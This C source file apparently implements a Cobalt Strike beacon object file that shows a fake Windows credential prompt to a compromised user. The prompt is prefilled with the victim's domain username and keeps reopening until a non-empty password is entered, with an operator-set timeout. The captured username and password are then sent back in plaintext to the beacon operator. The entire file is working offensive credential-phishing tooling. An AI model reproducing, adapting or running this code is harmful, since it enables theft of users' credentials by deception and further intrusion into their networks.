#define SECURITY_WIN32

#include <stdio.h>
#include <windows.h>
#include <wincred.h>
#include <Lmcons.h>
#include <security.h>
#include "credprompt.h"
#include "beacon.h"

#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "user32.lib")

typedef struct {
    UINT timeout;
    HANDLE hTimeoutEvent;
} TIMEOUT_STRUCT;



//START TrustedSec BOF print code: https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/src/common/base.c
#ifndef bufsize
#define bufsize 8192
#endif
char *output = 0;  
WORD currentoutsize = 0;
HANDLE trash = NULL; 
int bofstart();
void internal_printf(const char* format, ...);
void printoutput(BOOL done);

int bofstart() {   
    output = (char*)MSVCRT$calloc(bufsize, 1);
    currentoutsize = 0;
    return 1;
}

void internal_printf(const char* format, ...){
    int buffersize = 0;
    int transfersize = 0;
    char * curloc = NULL;
    char* intBuffer = NULL;
    va_list args;
    va_start(args, format);
    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args); 
    va_end(args);
    
    if (buffersize == -1) return;
    
    char* transferBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bufsize);
	intBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, buffersize);
    va_start(args, format);
    MSVCRT$vsnprintf(intBuffer, buffersize, format, args); 
    va_end(args);
    if(buffersize + currentoutsize < bufsize) 
    {
        MSVCRT$memcpy(output+currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    } else {
        curloc = intBuffer;
        while(buffersize > 0)
        {
            transfersize = bufsize - currentoutsize;
            if(buffersize < transfersize) 
            {
                transfersize = buffersize;
            }
            MSVCRT$memcpy(output+currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if(currentoutsize == bufsize)
            {
                printoutput(FALSE); 
            }
            MSVCRT$memset(transferBuffer, 0, transfersize); 
            curloc += transfersize; 
            buffersize -= transfersize;
        }
    }
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, intBuffer);
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, transferBuffer);
}

void printoutput(BOOL done) {
    char * msg = NULL;
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    MSVCRT$memset(output, 0, bufsize);
    if(done) {MSVCRT$free(output); output=NULL;}
}
//END TrustedSec BOF print code.



BOOL is_empty_or_whitespace(WCHAR *str) {
    if (str == NULL) {
        return TRUE;
    }

    while (*str) {
        if (!MSVCRT$iswspace(*str)) {
            return FALSE;
        }
        str++;
    }
    return TRUE;
}


BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
    WCHAR className[256] = {0};
    USER32$GetClassNameW(hWnd, className, sizeof(className) / sizeof(WCHAR));

    if (MSVCRT$wcscmp(className, L"Credential Dialog Xaml Host") == 0) {
        USER32$PostMessageW(hWnd, WM_CLOSE, 0, 0);
        return FALSE;
    }

    return TRUE;
}


DWORD WINAPI PromptWithTimeout(LPVOID lParam) {
    TIMEOUT_STRUCT *pTimeoutStruct = (TIMEOUT_STRUCT *)lParam;
    UINT timeout = pTimeoutStruct->timeout;
    HANDLE hTimeoutEvent = pTimeoutStruct->hTimeoutEvent;

    KERNEL32$Sleep(timeout * 1000);
    USER32$EnumWindows(EnumWindowsProc, 0);
    KERNEL32$SetEvent(hTimeoutEvent);

    return 0;
}


BOOL PromptForCreds(LPWSTR title, LPWSTR message, LPWSTR *username, LPWSTR *password, LPWSTR *domain, UINT timeout)
{
    PVOID packed_credentials = NULL;
    ULONG packed_credentials_size = 0;
	
	HANDLE hTimeoutEvent = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);

    // Get current username in DOMAIN\USERNAME format
    WCHAR domainUsername[DNLEN + UNLEN + 2];
    ULONG nSize = sizeof(domainUsername) / sizeof(WCHAR);
    if (SECUR32$GetUserNameExW(NameSamCompatible, domainUsername, &nSize)) {
        // Pack current username
        WCHAR prefilled_username[DNLEN + UNLEN + 2];
        MSVCRT$_snwprintf(prefilled_username, (sizeof(prefilled_username) / sizeof(WCHAR)) - 1, L"%s", domainUsername);

        CREDUI$CredPackAuthenticationBufferW(0, prefilled_username, L"", NULL, &packed_credentials_size);
        packed_credentials = MSVCRT$malloc(packed_credentials_size);
        CREDUI$CredPackAuthenticationBufferW(0, prefilled_username, L"", (PBYTE)packed_credentials, &packed_credentials_size);
    }
	
    BOOL bValidPassword = FALSE;
    DWORD result;
	
	TIMEOUT_STRUCT timeoutStruct;
	timeoutStruct.timeout = timeout;
	timeoutStruct.hTimeoutEvent = hTimeoutEvent;

	DWORD threadId;
	HANDLE hThread = KERNEL32$CreateThread(NULL, 0, PromptWithTimeout, (LPVOID)&timeoutStruct, 0, &threadId);
	
	internal_printf("\nPrompt event log:\n");
	internal_printf("==============================================\n");
	
    do {
        // Prompt for credentials
        CREDUI_INFOW credui_info = {0};
        credui_info.cbSize = sizeof(credui_info);
        credui_info.pszCaptionText = title;
        credui_info.pszMessageText = message;
		credui_info.hwndParent = NULL;
		
		HWND hWnd = USER32$GetForegroundWindow();
		if (hWnd != NULL) {
			credui_info.hwndParent = hWnd;
		}

        DWORD auth_package = 0;
        BOOL save_credentials = FALSE;
        ULONG out_credentials_size = 0;
        LPVOID out_credentials = NULL;

        result = CREDUI$CredUIPromptForWindowsCredentialsW(&credui_info, 0, &auth_package, packed_credentials, packed_credentials_size, &out_credentials, &out_credentials_size, &save_credentials, CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX);

        if (result == NO_ERROR)
        {
            *username = (LPWSTR)MSVCRT$malloc(CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR));
            *password = (LPWSTR)MSVCRT$malloc(CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR));
            *domain = (LPWSTR)MSVCRT$malloc(CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR));

            ULONG max_username = CREDUI_MAX_USERNAME_LENGTH;
            ULONG max_password = CREDUI_MAX_USERNAME_LENGTH;
            ULONG max_domain = CREDUI_MAX_USERNAME_LENGTH;
            CREDUI$CredUnPackAuthenticationBufferW(0, out_credentials, out_credentials_size, *username, &max_username, *domain, &max_domain, *password, &max_password);
	
            bValidPassword = !is_empty_or_whitespace(*password);
            if (!bValidPassword) {
                internal_printf("[!] User tried to enter empty password\n");
            }
            MSVCRT$memset(out_credentials, 0, out_credentials_size);
            OLE32$CoTaskMemFree(out_credentials);
		}
		
		else {
			if (KERNEL32$WaitForSingleObject(hTimeoutEvent, 0) == WAIT_OBJECT_0) {
				internal_printf("[!] Credential prompt timed out\n");
				break;
				
			} else {
				internal_printf("[!] User tried to close the prompt\n");
			}
		}
	} while (!bValidPassword);
	
	KERNEL32$TerminateThread(hThread, 0);
	KERNEL32$CloseHandle(hThread);
	
	if (packed_credentials)
	{
	MSVCRT$memset(packed_credentials, 0, packed_credentials_size);
		MSVCRT$free(packed_credentials);
	}

	return bValidPassword;
}


int go(char *args, int len) {
	LPWSTR title = L"";
	LPWSTR message = L"";
    LPWSTR username = NULL;
    LPWSTR password = NULL;
	LPWSTR domain = NULL;
    UINT timer_seconds = 60;
	datap parser;
	
	BeaconDataParse(&parser, args, len);
	title = BeaconDataExtract(&parser, NULL);
	message = BeaconDataExtract(&parser, NULL);
	timer_seconds = BeaconDataInt(&parser, NULL);
	if(!bofstart()) return;
	
	
    if (PromptForCreds(title, message, &username, &password, &domain, timer_seconds))
	{
        internal_printf("[+] Entered credentials by user:\n\tUsername: %ls\n\tPassword: %ls\n", username, password);
		printoutput(TRUE);
		
		MSVCRT$memset(password, 0, MSVCRT$wcslen(password) * sizeof(WCHAR));
        MSVCRT$free(username);
        MSVCRT$free(password);
        MSVCRT$free(domain);
    }
    else
    {
		printoutput(TRUE);
    }

    return 0;
}

